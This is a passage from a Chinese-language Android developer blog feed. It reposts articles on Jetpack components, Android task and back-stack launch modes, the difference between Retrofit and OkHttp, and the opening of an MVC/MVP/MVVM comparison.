Binding(数据绑定)：数据绑定库是一种支持库，借助该库，可以使用声明式将布局中的界面组件绑定到应用中的数据源。</li><li>Lifecycles：方便管理 Activity 和 Fragment 生命周期，帮助开发者书写更轻量、易于维护的代码。</li><li>LiveData：是一个可观察的数据持有者类。与常规observable不同，LiveData是有生命周期感知的。</li><li>Navigation：处理应用内导航所需的一切。</li><li>Paging：帮助开发者一次加载和显示小块数据。按需加载部分数据可减少网络带宽和系统资源的使用。</li><li>Room：Room持久性库在SQLite上提供了一个抽象层，帮助开发者更友好、流畅的访问SQLite数据库。</li><li>ViewModel：以生命周期感知的方式存储和管理与UI相关的数据。</li><li>WorkManager：即使应用程序退出或设备重新启动，也可以轻松地调度预期将要运行的可延迟异步任务。<br>谷歌推荐的应用架构：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-15038fb7f82a8e3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><p><strong>Behavior(行为)：</strong><br>行为组件可帮助开发者的应用与标准 Android 服务（如通知、权限、分享和 Google 助理）相集成。它包含如下组件库：</p><ul><li>CameraX：帮助开发者简化相机应用的开发工作。它提供一致且易于使用的 API 界面，适用于大多数 Android 设备，并可向后兼容至 Android 5.0（API 级别 21）。</li><li>DownloadManager(下载管理器)：可处理长时间运行的HTTP下载，并在出现故障或在连接更改和系统重新启动后重试下载。</li><li>Media &amp; playback(媒体&amp;播放)：用于媒体播放和路由（包括 Google Cast）的向后兼容 API。</li><li>Notifications(通知)：提供向后兼容的通知 API，支持 Wear 和 Auto。</li><li>Permissions(权限)：用于检查和请求应用权限的兼容性 API。</li><li>Preferences(偏好设置)：提供了用户能够改变应用的功能和行为能力。</li><li>Sharing(共享)：提供适合应用操作栏的共享操作。</li><li>Slices(切片)：创建可在应用外部显示应用数据的灵活界面元素。</li></ul><p><strong>UI(界面组件)：</strong><br>界面组件可提供各类view和辅助程序，让应用不仅简单易用，还能带来愉悦体验。它包含如下组件库：</p><ul><li>Animation &amp; Transitions(动画&amp;过度)：提供各类内置动画，也可以自定义动画效果。</li><li>Emoji(表情符号)：使用户在未更新系统版本的情况下也可以使用表情符号。</li><li>Fragment：组件化界面的基本单位。</li><li>Layout(布局)：xml书写的界面布局或者使用Compose完成的界面。</li><li>Palette(调色板)：从调色板中提取出有用的信息。</li></ul><h1 id="使用Jetpack"><a href="#使用Jetpack" class="headerlink" title="使用Jetpack"></a>使用Jetpack</h1><p>目前Jetpack组件已经包含在AndroidX中，所以如果项目以及迁移到了AndroidX了，就不需要额外导包。如果没有兼容AndroidX 那么需要在gradle中进行配置：<br>打开项目的build.gradle添加google()代码库，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如只是单纯的使用Lifecycle，那么打开app的build.gradle 进行依赖的添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">implementation &quot;android.arch.lifecycle:runtime:$lifecycle_version&quot;</span><br><span class="line">annotationProcessor &quot;android.arch.lifecycle:compiler:$lifecycle_version&quot;</span><br><span class="line">implementation &quot;android.arch.lifecycle:common-java8:$lifecycle_version&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android tasks 和 back stack</title>
      <link href="/2021/09/11/Android-tasks-%E5%92%8C-back-stack/"/>
      <url>/2021/09/11/Android-tasks-%E5%92%8C-back-stack/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://blog.csdn.net/mypotatolove/article/details/81264125">Android Tasks and Back Stack</a> (遵循CC 4.0 BY-SA版权协议)<br><img src="https://upload-images.jianshu.io/upload_images/15531792-83ed86bc2c776c67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这是Android官网（<a href="https://developer.android.google.cn/guide/components/activities/tasks-and-back-stack%EF%BC%89%E4%B8%8A%E9%9D%A2%E5%85%B3%E4%BA%8ETask%E5%92%8CBack">https://developer.android.google.cn/guide/components/activities/tasks-and-back-stack）上面关于Task和Back</a> Stack的描述。我今天想从一下几个问题出发去了解Task和Back Stack。</p><h1 id="1-Task和Back-Stack，Activity的关系"><a href="#1-Task和Back-Stack，Activity的关系" class="headerlink" title="1. Task和Back Stack，Activity的关系"></a>1. Task和Back Stack，Activity的关系</h1><p>有人说Task == Back Stack，也有说Task 包含Back Stack，但是这些都说法不太准确。我认为Android使用Task来管理一个App的Activities，而Task是以Stack(栈)这种数据结构来存放所有的Activity。A task is a collection of activities that users interact with when performing a certain job，这句话表明task就是一些activitis的集合，集合的数据结构可以有很多种，我们可以用数组和队列来表示，而android系统选用了stack这种数据结构作为activities的存放方式。一个app只有一个Stack，所有的activities都位于同一个Stack（栈）中，不同的activity可以被划分为不同的task中，所以一个Stack（栈）中有几个task。<br>Stack（栈）这种数据结构的特点就是后进先出，由于栈的这种特点所以activities和tasks的默认的行为可以用下图来表示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-8e42b83fae3329d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>当前的activity（Activity 1）启动另外一个activity（Activity 2）时，新的activity（Activity 2）就被放到栈顶并获得用户焦点显示给用户，之前的activity（Activity 1）仍然存在Stack（栈）中，但是被停止。系统仍然会保存之前activity（Activity 1）的状态。新的activity（Activity 3）被启动时又会被放到栈顶，之前activity（Activity 1，Activity 2）被压入栈中。当用户点击返回按钮时，栈顶activity（Activity 3）会出栈被销毁，位于下面的activity（Activity 2）就会成为栈顶activity恢复之前的状态。</p><p>位于栈中的activities永远不会被重新排列只会有进栈和出栈的操作，新的activity被启动时就会进栈，当用户点击返回按钮时当前activity会被销毁并出栈。activities永远不会被重新排列，如果你的app中一个activity可以从多个activity被启动，每次一个新的activity实例会被创建并添加到stack（栈）中。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-72feb843f159c7d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="2-Task的管理"><a href="#2-Task的管理" class="headerlink" title="2. Task的管理"></a>2. Task的管理</h1><p>默认情况下一个app的所有的activity都是位于同一个任务栈中，遵循着后进先出的原则。但是你也许想让一个新启动的activity放在一个新的task中，而不是当前存在的task中。或者想直接使用当前栈中已经存在的activity实例，而不是重新创建一个新的activity例子。或者你想要清除一个task中除了root activity外的所有activity，当用户离开task的时候。</p><p>你可以通过activiyt的属性和intent的flag去改变task的默认的行为：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-98988c92021b5be5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>通过launchMode你可以定义新的activity实例和当前的task之间的联系，设置不同的launchMode有两种方式，一种是通过在manifest文件中设置activity的launchMode属性，一种是在启动一个Activity设置intent的flag。</p><p>通过activity的launchMode属性时有四种模式：</p><p>a. “standard”(the default mode)</p><p>标准模式也是默认模式，新启动的activity添加到当前的task中，不管当前task中是否有该activity的实例，都会启动新的activity。一个task可以存在多个相同的activity实例，被实例化的actiivty也可以存在多个不同的task中。</p><p>b. “singleTop”<br> 如果该activity实例已经存在于当前task的顶部，系统不会创建一个该activity的实例，而是调用activity的onNewIntent(onNewIntent –&gt; onStart –&gt; onResume)方法。如果该activity实例已经存在于当前task中，但不是存在于顶部，系统还是会去创建该activity的一个实例并放在当前activity的顶部。launchMode为singleTop的activity可以被多次实例化，一个task中可以存在多个实例，多个实例也可以存在不同的task中。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-6b8381c57b4d6ab8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>c. “singleTask”</p><p>关于singleTask，android官网上面的解释是：如果该activity实例不存在，系统会实例化该activity并创建一个单独的task，将实例化的activity作为task的根部。 但是在实际开发过程中，当我们只是把一个activity的launchMode声明为singleTask时，发现系统并没有为这个activity的实例单独创建一个task。在实验过程中发现，系统是否会为该activity创建新的task还与activity的属性taskAffinity有关。在声明activity时，我们一般没有单独设置taskAffinity属性，在没有特殊设置时taskAffinity属性的值为manifest中设置的包名。在启动一个activity时，如果启动的activity与被启动的activity的taskAffinity属性相同时，系统不会重新创建一个新的task，如果taskAffinity属性不同时系统就会为新启动的activity创建一个新的task。如果该activity已经存在于一个task中时，系统不会多次创建这个activity，系统会将整个task放到前台并将位于同一个task中在该activity之上的activity就会被清除出activity。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-041cd7845d2a573b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-e053f2554f7dde42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>d. “singleInstance”</p><p>系统永远只存在一个该activity在一个单独的task中，由该activity启动的其他activities都会在另外单独的task中，存放该activity的task永远不会放其他activities。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-370f01e82177e20a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>实际上一个app所有的task和activity都是位于同一个Stack（栈）中，用户为了完成某个功能执行一些列的操作会形成一个activity序列，这个activity序列就称为task。一个app根据系统功能可以有多个task，所有的task都是放在同一个Stack（栈）中，task在栈中的顺序会根据用户的操作而改变。用户按back键时，栈中的activity会按顺序出栈。</strong></p><h1 id="3-Intent-flags"><a href="#3-Intent-flags" class="headerlink" title="3. Intent flags"></a>3. Intent flags</h1><p>关于launchMode和intent flags之间的关系，android 官网上面有如下说明：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-af2721b1ada09295.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>launchMode设定的属性可能被intent flags的设定覆盖，在实际测试时发现并不是所有的情况下intent flags的设定都会覆盖launchMode的设定。如果Activity A设定的launchMode为standard或singleTop，Activity B 在启动Activity A时设置Intent flag为 FLAG_ACTIVITY_NEW_TASK时，在这种两种情况下flag的设定会覆盖launchMode的设定。但是当Activity A设定的launchMode为singleTask或singleInstance时，这两种情况下launchMode的设定并不会被覆盖。</p><p>a. FLAG_ACTIVITY_NEW_TASK</p><p>如果被启动的activity的task不存在时（之前没有taskAffinity相同的activity被启动），系统会创建新的task。但是已经有该activity对应的task存在时（之前有taskAffinity相同的activity被启动），系统不会创建新的task。和singleTask有不同之处，如果task中存在该activity，系统仍会创建新的activity，而不是将已经存在的activity移动的顶部。<br>b. FLAG_ACTIVITY_SINGLE_TOP</p><p>可以覆盖掉launchMode为standard的设置，和singleTop的效果一样，当activity已经位于task顶部时不会在创建新的activity实例，会调用已有实例的onNewIntent方法。</p><p>c. FLAG_ACTIVITY_CLEAR_TOP</p><p>如果该activity已经存在于当前的task时，系统不会创建一个新的activity实例，而时清除掉task中位于该activity之上的其他activity，但是清除其他activty后返回该activity时onNewIntent并不会被调用。如果当前task不存在该activity时就会创建新的activity。 </p><h1 id="4-Handling-affinities"><a href="#4-Handling-affinities" class="headerlink" title="4. Handling affinities"></a>4. Handling affinities</h1><p>affinity属性指明了activity更倾向于放在哪个task中。一个app中所有activities都是有设置taskAffinity属性的，默认情况下为manifest中设置的包名，所以默认情况下所有的activity都是位于相同的task中。我们可以去修改一个activity的taskAffinity属性，但属性值不能和默认值一样。不同app中的activity可以共享同一个taskAffinity属性值，一个app中不同的activity也可以有不同的taskAffinity属性值。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e6ae40832164a6c7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="5-清除Task"><a href="#5-清除Task" class="headerlink" title="5.清除Task"></a>5.清除Task</h1><p>如果用户离开一个task比较长时间，系统会清除掉task中除了root activity的activities。当用户返回到这个task时，只有位于这个task底部的activity会被恢复。系统这样做是因为，用户在一段时间之后用户可能已经放弃了之前所做的事情，用户重新返回是为了开始新的行为。但是你可以通过activity的以下三种属性去修改这些行为：</p><p>a. alwaysRetainTaskState</p><p>如果在一个task的root activity中设置这个属性为true，系统不会清除activities即使用户离开task比较长时间之后。</p><p>b. clearTaskOnLaunch</p><p> 如果在一个task的root activity中设置这个属性为true，在用户离开这个task之后，系统会清除掉task中除底部以外的所有activities。</p><p>c. finishOnTaskLaunch</p><p>这个属性和clearTaskOnLaunch类似，但是这个属性是专门针对单个的activity，而不是整个task。他可以让任何activity出栈包括root activity。当这个属性设置为true之后，这个activity只是在当前会话的时候是这个task的一部分，当离开这个task之后这个activity就不再存在了。</p><p>alwaysRetainTaskState和clearTaskOnLaunch属性都是需要在root activity中设置。关于root activity的说法有两种：一种是说位于task底部的activity就是为root activity，如果是这样那么任何一个activity都可能成为root activity。另一种说法是声明了”android.intent.action.MAIN”和”android.intent.category.LAUNCHER”的activity为root activity。之前我也是认为第一种是正确的，但是实际在设置的时候发现只有在声明了”android.intent.action.MAIN”和”android.intent.category.LAUNCHER”的activity中设置alwaysRetainTaskState和clearTaskOnLaunch属性时才能生效。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Retrofit 与 OKHttp 介绍</title>
      <link href="/2021/09/05/Retrofit-%E4%B8%8E-OKHttp-%E4%BB%8B%E7%BB%8D/"/>
      <url>/2021/09/05/Retrofit-%E4%B8%8E-OKHttp-%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>[转]<br><a href="https://blog.csdn.net/fitaotao/article/details/103903429">Android OkHttp和Retrofit的区别与联系</a><br><a href="https://www.jianshu.com/p/25fbdd0b0b56">OkHttp+Retrofit使用分析</a></p><h1 id="1-OKHttp"><a href="#1-OKHttp" class="headerlink" title="1. OKHttp"></a>1. OKHttp</h1><p>OkHttp是Square开源的轻量级框架，是一款现代、高效、快速的Android版Http client。</p><h4 id="1-OkHttp特性："><a href="#1-OkHttp特性：" class="headerlink" title="(1)OkHttp特性："></a>(1)OkHttp特性：</h4><p>它的设计和实现的首要目标便是高效，有如下特性：</p><ul><li><p>支持SPDY、连接池、Gzip和Http缓存（记住第一条可直接推及记起下面四条，感觉萌萌哒^_^）;</p></li><li><p>支持SPDY，因此可以同一IP多个连接共享同一个socket（SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强，具体请自行百度）；</p></li><li><p>在Http/2不可用时, 连接池可极大减少延时；</p></li><li><p>支持Gzip压缩响应体，降低传输内容的大小；</p></li><li><p>支持Http缓存，避免重复请求；</p></li><li><p>服务器配置多IP情况下，当前IP请求失败，支持自动切换到其他IP；</p></li><li><p>使用Okio来简化数据的访问与存储，提高性能；</p></li><li><p>OkHttp还处理了代理服务器问题和SSL握手失败问题；</p></li></ul><h4 id="2-OkHttp使用"><a href="#2-OkHttp使用" class="headerlink" title="(2) OkHttp使用"></a>(2) OkHttp使用</h4><p>OkHttp主要支持以下使用方式（记住多少算多少吧）：</p><ul><li><p>异步get请求；</p></li><li><p>异步post请求；</p></li><li><p>异步文件上传；</p></li><li><p>异步文件下载；</p></li><li><p>异步上传Multipart文件；（多种类型文件合在一起，同一个请求上传）</p></li><li><p>上传下载的进度回调；</p></li><li><p>加载图片；</p></li><li><p>支持请求回调，直接返回对象、对象集合；</p></li><li><p>支持session的保持；</p></li><li><p>支持自签名网站https的访问，提供方法设置下证书就行；</p></li><li><p>支持取消某个请求；</p></li></ul><h4 id="3-OkHttp流程图"><a href="#3-OkHttp流程图" class="headerlink" title="(3) OkHttp流程图"></a>(3) OkHttp流程图</h4><p>为了帮助记忆，留下Okhttp请求流程图（用于忽悠人）：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-1d81984bbc6dec34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Okhttp请求流程图"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-085ed0cbc14594e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="架构介绍"><br>由上图可以看到，Android客户端使用这套框架进行网络请求，基本层次结构分为：Okio进行流操作，处理与服务端的传输信息；OkHttp作为网络请求客户端对请求与响应进行了一层封装；Retrofit在此进行的操作是对每个请求与响应创建的格式化操作，处理请求以及转化接收的响应数据，可以添加不同的Converter进行不同数据结构的转化。<br>Android系统提供了两种HTTP通信类，HttpURLConnection和HttpClient。由于HttpClient的API太多，难以对它们进行改进容易破坏兼容性，所以Android官方停止了对它的维护以及集成。OkHttp是一个相对成熟的解决方案，据说Android4.4的源码中可以看到HttpURLConnection已经替换成了OkHttp实现。<br><a href="https://link.jianshu.com/?t=https://android-developers.googleblog.com/2011/09/androids-http-clients.html">Android官方对两种请求方式的选择建议</a></p><h4 id="4-OkHttp的缺点"><a href="#4-OkHttp的缺点" class="headerlink" title="(4) OkHttp的缺点"></a>(4) OkHttp的缺点</h4><ul><li><p>是消息回来需要切到主线程，主线程要自己去写。</p></li><li><p>调用比较复杂，需要自己进行封装。</p></li><li><p>缓存失效：网络请求时一般都会获取手机的一些硬件或网络信息，比如使用的网络环境。同时为了信息传输的安全性，可能还会对请求进行加密。在这些情况下OkHttp的缓存系统就会失效了，导致用户在无网络情况下不能访问缓存。</p></li></ul><p>缓存失效解决方案：先过滤可变参数，然后进行手动缓存；不要使用随网络状态变化的参数；</p><h1 id="2-Retrofit"><a href="#2-Retrofit" class="headerlink" title="2. Retrofit"></a>2. Retrofit</h1><p>Retrofit是Square开源的一款适用于Android网络请求的框架。Retrofit底层是基于OkHttp实现的，与其他网络框架不同的是，它更多使用运行时注解的方式提供功能。</p><h4 id="1-Retrofit优缺点"><a href="#1-Retrofit优缺点" class="headerlink" title="(1) Retrofit优缺点"></a>(1) Retrofit优缺点</h4><p><strong>优点：</strong></p><ul><li><p>可以配置不同HTTP client来实现网络请求，如okhttp、httpclient等；</p></li><li><p>请求的方法参数注解都可以定制；</p></li><li><p>支持同步、异步和RxJava；</p></li><li><p>超级解耦；</p></li><li><p>可以配置不同的反序列化工具来解析数据，如json、xml等；</p></li><li><p>使用非常方便灵活；</p></li><li><p>框架使用了很多设计模式(感兴趣的可以看看源码学习学习)；</p></li></ul><p>附加Stay大神整理的retrofit源码流程图：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-25f32d17e292c3ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="retrofit源码流程图"></p><p><strong>缺点</strong>：</p><ul><li><p>不能接触序列化实体和响应数据；</p></li><li><p>执行的机制太严格；</p></li><li><p>使用转换器比较低效；</p></li><li><p>只能支持简单自定义参数类型；</p></li></ul><h4 id="2-Retrofit注解"><a href="#2-Retrofit注解" class="headerlink" title="(2) Retrofit注解"></a>(2) Retrofit注解</h4><p>Retrofit注解分为三大类，分别是HTTP请求方法注解（8种）、标记类注解（3种）和参数类注解（11种）。</p><ul><li><p>HTTP请求方法注解：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS、HTTP</p></li><li><p>标记类注解：FormUrlEncoded、Multipart、Streaming</p></li><li><p>参数类注解:Headers、Header、Body、Field、FieldMap、Part、PartMap、Path、Query、QueryMap、Url</p></li></ul><h1 id="3-OkHttp和Retrofit的联系"><a href="#3-OkHttp和Retrofit的联系" class="headerlink" title="3. OkHttp和Retrofit的联系"></a>3. OkHttp和Retrofit的联系</h1><p>Retrofit底层对网络的访问默认是基于okhttp，不过Retrofit非常适合于restful url格式的请求，更多使用注解的方式提供功能，下面这个网络请求流程图，可以更直观的理解OkHttp和Retrofit的关系。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4e9d9354ac856596.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Retrofit框架网络请求流程图"></p><p>网络请求：APP发起网络请求，Retrofit通过注解配置请求参数、Header、Url之后，通过OkHttp发生网络请求给服务器。</p><p>服务器响应：服务器返回响应数据，OkHttp将数据传递给Retrofit，再把数据直接传递给APP，界面刷新反馈结果给用户。</p><p><strong>OkHttp和Retrofit都是网络开源框架，但是他们之间的区别请不要混淆</strong></p><p>职责不同：</p><ul><li><p>Retrofit主要负责应用层面的封装，就是说主要面向开发者，方便使用，比如请求参数，响应数据的处理，错误处理等等。</p></li><li><p>OkHttp主要负责socket部分的优化，比如多路复用，buffer缓存，数据压缩等等。</p></li></ul><p>封装不同：</p><ul><li><p>Retrofit封装了具体的请求，线程切换以及数据转换。</p></li><li><p>OkHttp 是基于Http协议封装的一套请求客户端，虽然它也可以开线程，但根本上它更偏向真正的请求，跟HttpClient, HttpUrlConnection的职责是一样的。</p></li></ul><p>另外，网上一般都推荐RxJava+Retrofit+OkHttp框架，Retrofit负责请求的数据和请求的结果，使用接口的方式呈现，OkHttp负责请求的过程，RxJava负责异步，各种线程之间的切换，用起来炒鸡爽。</p><h1 id="4-OkHttp与volley-retrofit-android-async-http的关系"><a href="#4-OkHttp与volley-retrofit-android-async-http的关系" class="headerlink" title="4.OkHttp与volley, retrofit, android-async-http的关系"></a>4.OkHttp与volley, retrofit, android-async-http的关系</h1><p>volley, retrofit, android-async-http 帮你封装了具体的请求，线程切换以及数据转换。</p><p>而OkHttp 是基于http协议封装的一套请求客户端，虽然它也可以开线程，但根本上它更偏向真正的请求，跟HttpClient, HttpUrlConnection的职责是一样的。所以不要混淆。</p><p>首先，我想即使你单纯使用OkHttp，还是会再包一层的，这样就等价于Volley之流的框架，只是封装的好与坏而已。</p><p>android-async-http内部实现是基于HttpClient, 想必你肯定知道6.0之后HttpClient是不是系统自带的了，不过它在最近的更新中将HttpClient的所有代码copy了一份进来，所以还能使用。</p><p>Volley是官方出的，volley在设计的时候是将具体的请求客户端做了下封装：HurlStack，也就是说可以支持HttpUrlConnection, HttpClient, OkHttp，相当于模版模式吧，这样解耦还是非常方便的，可以随意切换，如果你之前使用过Volley，并习惯使用，那直接写个OkHttp扩展就行了。</p><p>Retrofit因为也是square出的，所以大家可能对它更崇拜些。Retrofit的跟Volley是一个套路，但解耦的更彻底:比方说通过注解来配置请求参数，通过工厂来生成CallAdapter，Converter，你可以使用不同的请求适配器(CallAdapter), 比方说RxJava，Java8, Guava。你可以使用不同的反序列化工具(Converter)，比方说json, protobuff, xml, moshi等等。Retrofit的特点我个人认为是简化了网络请求流程，同时自己内部对OkHtttp客户端做了封装，同时2.x把之前1.x版本的部分不恰当职责都转移给OkHttp了(例如Log，目前用OkHttp的Interceptor来实现)，这样的好处是职责清晰，Retrofit做自己该做的事儿。而且Retrofit提供不同的Json Converter实现（也可以自定义），同时提供RxJava支持(返回Observable对象)，配合Jackson(或者Gson)和RxJava，再加上Dagger2，你的效率至少可以提高一倍。 Retrofit + OkHttp + RxJava + Dagger2 可以说是目前比较潮的一套框架，但是需要有比较高的门槛。       推荐：Retrofit的官方教程</p><p>炒鸡解耦，里面涉及到超多设计模式，个人觉得是很经典的学习案例。虽然支持Java8， Guava你可能也不需要用到。xml，protobuff等数据格式你也可能不需要解析。but，万一遇到鬼了呢。</p><p>至于性能上，个人觉得这完全取决于请求client，也就是okhttp的性能，跟这些封装工具没太大关系。</p><p>至于RxJava，最好充分理解其原理之后再使用，别人云亦云，特别team人数多的情况下，总得有个完全精通的吧，万一掉坑里了呢。。。选最适合项目的，选大多数人选择的，选简单易用的，就这么个标准。</p><h1 id="5-一些建议"><a href="#5-一些建议" class="headerlink" title="5.一些建议"></a>5.一些建议</h1><p>由于这两个框架是这周开始接触的，根本没时间去尝试写demo测试，直接看了《Android进阶之光》的框架篇和网上的一些资料，其实一头懵逼。只是表面上懂一点点皮毛，建议大家可以尝试去了解应用场景，尝试在项目中或者自己写个demo去实践一下，然后再去看源码，先理清楚具体调用流程，再根据优点和特性，看框架源码的具体实现。</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>《Android进阶之光》</p><p><a href="http://square.github.io/okhttp/">OKhttp官方网站</a></p><p><a href="https://www.jianshu.com/p/b965d4309c8f">网络框架三部曲：OkHttp笔记</a></p><p><a href="https://www.jianshu.com/p/45cb536be2f4">Retrofit分析-漂亮的解耦套路</a></p><p><a href="https://blog.csdn.net/carson_ho/article/details/73732076">这是一份很详细的 Retrofit 2.0 使用教程（含实例讲解）</a></p><p><a href="https://blog.csdn.net/jhg1204/article/details/51397689">OkHttp框架缓存的缺陷</a></p><p><a href="https://www.zhihu.com/question/35189851">知乎：okhttp,retrofit,android-async-http,volley应该选择哪一个</a></p><p><a href="https://www.jianshu.com/p/4d67fe493ebf">OkHttp和Retrofit</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈MVC,MVP,MVVM渐进变化及React与Vue比较</title>
      <link href="/2021/08/29/%E6%B5%85%E8%B0%88MVC-MVP-MVVM%E6%B8%90%E8%BF%9B%E5%8F%98%E5%8C%96%E5%8F%8AReact%E4%B8%8EVue%E6%AF%94%E8%BE%83/"/>
      <url>/2021/08/29/%E6%B5%85%E8%B0%88MVC-MVP-MVVM%E6%B8%90%E8%BF%9B%E5%8F%98%E5%8C%96%E5%8F%8AReact%E4%B8%8EVue%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<p>[转] <a href="https://segmentfault.com/a/1190000019991211">浅谈MVC,MVP,MVVM渐进变化及React与Vue比较</a></p><h1 id="1-设计模式"><a href="#1-设计模式" class="headerlink" title="1 设计模式"></a>1 设计模式</h1><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC全名是Model View Controller,把应用程序分成三部分分别是:</p><ul><li>Model(业务模型): 用于管理应用程序数据处理逻辑的部分,通过观察者模式(Pub&amp;Sub / Events)发送消息给View;</li><li>View(视图界面): 用于处理数据显示的部分,注册并接收Model的数据更新视图,通常视图是依据模型数据创建的;</li><li>Controller(控制器): 用于连接模型和视图控制应用程序的流程(事件绑定等),通常控制器负责响应View的事件（路由，键盘，鼠标等），调用Model的接口进行操作;<br><img src="https://upload-images.jianshu.io/upload_images/15531792-cf6a4122b5fe2746.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol><li>当用户在视图界面中发生交互事件，View捕获到这个操作会把处理的权利交移给Controller;</li><li>Controller会对来自View数据进行预处理并决定调用Model的相关暴露接口;</li><li>Model执行相关的业务逻辑更改数据之后会通知有关的View重新渲染;</li><li>View收到通知后从Model请求最新的数据，然后重新渲染相关视图界面;</li></ol><p>还有一种情况: MVC允许在不改变视图外观的情况下改变视图对用户输入的响应方式,只要用不同种类的controller实例替换即可。例如改变URL触发hashChange事件,用户不经过View直接到达Controller最后再影响回View.</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点:"></a>优点:</h4><ul><li>耦合性低,MVC 分层有助于管理复杂的应用程序,同时也让应用程序的测试更加容易;</li><li>重用性高,多个视图能共享一个模型,可以做到多视图同时更新;</li><li>生命周期成本低,MVC使开发和维护用户接口的技术含量降低;</li><li>部署快,只需要部署对应部分代码而不是完整项目;</li><li>可维护性高,分离视图层和业务逻辑层也使得应用更易于维护和修改;</li><li>有利软件工程化管理,可以使用控制器来联接不同的模型和视图去完成用户的需求;<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点:"></a>缺点:</h4></li><li>没有明确的定义,完全理解MVC并不是很容易,现存就有很多对MVC不同解读实现的方式;</li><li>不适合小型，中等规模的应用程序,花费大量时间将MVC应用到规模并不是很大的应用程序通常会得不偿失;</li><li>增加系统结构和实现的复杂性,对于简单的界面，会增加结构的复杂性，并可能产生过多的更新操作，降低运行效率;</li><li>视图与控制器间的过于紧密的连接,视图没有控制器的存在，其应用是很有限的，反之亦然,导致测试困难(依据模型数据创建部分);</li><li>视图对模型数据的低效率访问,依据模型操作接口的不同，视图可能需要多次调用才能获得足够的显示数据;</li><li>观察者模式由于事件触发的隐式行为可能导致很难查找问题的来源并影响其解决;</li></ul><h2 id="MVP"><a href="#MVP" class="headerlink" title="MVP"></a>MVP</h2><p>MVP全名是Model-View-Presenter,从经典的模式MVC演变而来,分两种情况:</p><h4 id="Passive-View-被动视图"><a href="#Passive-View-被动视图" class="headerlink" title="Passive View(被动视图)"></a>Passive View(被动视图)</h4><p>Presenter占据绝对主导地位,掌控著Model和View,而后两者之间互不联系.</p><ul><li>Model(业务模型): 用于管理应用程序数据处理逻辑的部分,通过观察者模式(Pub&amp;Sub / Events)发送消息给Presenter;</li><li>View(视图界面): 用于处理数据显示的部分,传递事件和提供相关接口给Presenter;</li><li>Presenter(派发器): 作为中间层同步控制著Model数据修改和View视图变化;<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3b68aff013e94953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程:"></a>流程:</h4><ol><li>当用户在视图界面中发生交互事件，View捕获到这个操作会把处理的权利交移给Presenter进行处理;</li><li>Presenter需要时候可以获取Model其中的数据,并对Model进行操作更新;</li><li>Model数据变化之后会通知Presenter;</li><li>Presenter收到通知后会执行View提供的相关接口重新渲染相关视图界面;<h4 id="MVC和MVP-Passive-View-区别"><a href="#MVC和MVP-Passive-View-区别" class="headerlink" title="MVC和MVP(Passive View)区别:"></a>MVC和MVP(Passive 